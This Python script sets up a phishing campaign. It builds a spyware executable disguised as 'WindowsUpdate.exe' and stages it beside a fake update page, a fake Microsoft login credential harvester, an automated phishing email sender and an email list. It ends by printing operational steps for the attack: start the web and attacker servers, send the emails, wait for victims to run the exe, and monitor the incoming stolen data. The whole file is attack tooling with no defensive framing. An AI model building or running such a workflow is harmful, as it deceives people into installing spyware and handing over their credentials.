"""
Setup Delivery Technique 1 - Prepares all files for phishing attack
Builds the executable and sets up the web server directory
"""

import os
import sys
import shutil
import subprocess

def print_banner():
    print("="*70)
    print("📦 DELIVERY TECHNIQUE 1 SETUP")
    print("="*70)

def check_exe_exists():
    """Check if WindowsUpdate.exe exists"""
    malicious_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    exe_paths = [
        os.path.join(malicious_dir, "dist", "WindowsUpdate.exe"),
        os.path.join(malicious_dir, "build", "WindowsUpdate", "WindowsUpdate.exe"),
    ]
    
    for path in exe_paths:
        if os.path.exists(path):
            return path
    return None

def build_exe():
    """Build the spyware executable"""
    print("\n[1/3] Building spyware executable...")
    malicious_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    build_script = os.path.join(malicious_dir, "build_executable.py")
    
    if not os.path.exists(build_script):
        print("❌ build_executable.py not found!")
        return False
    
    try:
        result = subprocess.run([sys.executable, build_script], cwd=malicious_dir)
        return result.returncode == 0
    except Exception as e:
        print(f"❌ Build failed: {e}")
        return False

def copy_exe_to_delivery():
    """Copy the built exe to delivery folder"""
    print("\n[2/3] Copying WindowsUpdate.exe to delivery folder...")
    
    delivery_dir = os.path.dirname(os.path.abspath(__file__))
    exe_path = check_exe_exists()
    
    if not exe_path:
        print("❌ WindowsUpdate.exe not found after build!")
        print("   Expected locations:")
        malicious_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        print(f"   - {os.path.join(malicious_dir, 'dist', 'WindowsUpdate.exe')}")
        return False
    
    dest_path = os.path.join(delivery_dir, "WindowsUpdate.exe")
    try:
        shutil.copy2(exe_path, dest_path)
        file_size = os.path.getsize(dest_path) / (1024 * 1024)
        print(f"✅ Copied: {dest_path}")
        print(f"   Size: {file_size:.2f} MB")
        return True
    except Exception as e:
        print(f"❌ Copy failed: {e}")
        return False

def verify_files():
    """Verify all required files exist"""
    print("\n[3/3] Verifying delivery files...")
    
    delivery_dir = os.path.dirname(os.path.abspath(__file__))
    required_files = [
        "WindowsUpdate.exe",
        "windows-update.html",
        "fake-microsoft-login.html",
        "auto_send_phishing.py",
        "email_dataset.csv"
    ]
    
    all_exist = True
    for filename in required_files:
        filepath = os.path.join(delivery_dir, filename)
        if os.path.exists(filepath):
            size = os.path.getsize(filepath)
            if filename.endswith('.exe'):
                print(f"✅ {filename} ({size / (1024*1024):.2f} MB)")
            else:
                print(f"✅ {filename} ({size / 1024:.1f} KB)")
        else:
            print(f"❌ {filename} - MISSING!")
            all_exist = False
    
    return all_exist

def show_next_steps():
    """Show user what to do next"""
    print("\n" + "="*70)
    print("✅ SETUP COMPLETE!")
    print("="*70)
    print("\nYour delivery folder is ready with:")
    print("  • WindowsUpdate.exe (spyware payload)")
    print("  • windows-update.html (phishing landing page)")
    print("  • fake-microsoft-login.html (credential harvester)")
    print("  • auto_send_phishing.py (email sender)")
    print("\nNEXT STEPS:")
    print("="*70)
    print("1. Start web server in this directory:")
    print("   cd delivery\\delivery_technique1")
    print("   python -m http.server 8000")
    print()
    print("2. In another terminal, start attacker server:")
    print("   cd malicious_code")
    print("   python attacker_server.py")
    print()
    print("3. Send phishing emails:")
    print("   python auto_send_phishing.py")
    print()
    print("4. Wait for victims to:")
    print("   - Open email")
    print("   - Click link to windows-update.html")
    print("   - Download WindowsUpdate.exe")
    print("   - Run the exe")
    print()
    print("5. Monitor attacker_server.py for incoming data!")
    print("="*70)

def main():
    print_banner()
    
    # Check if exe already exists
    exe_path = check_exe_exists()
    if exe_path:
        print(f"\n✅ WindowsUpdate.exe already exists: {exe_path}")
        use_existing = input("Use existing exe? (Y/n): ").strip().lower()
        if use_existing != 'n':
            if not copy_exe_to_delivery():
                return
            if verify_files():
                show_next_steps()
            return
    
    # Build exe
    print("\n⚠️  Building executable will take 1-2 minutes...")
    confirm = input("Continue? (Y/n): ").strip().lower()
    if confirm == 'n':
        print("❌ Cancelled!")
        return
    
    if not build_exe():
        print("\n❌ Failed to build executable!")
        print("Try manually:")
        print("  cd malicious_code")
        print("  python build_executable.py")
        return
    
    # Copy to delivery folder
    if not copy_exe_to_delivery():
        return
    
    # Verify all files
    if not verify_files():
        print("\n⚠️  Some files are missing!")
    else:
        show_next_steps()

if __name__ == "__main__":
    main()
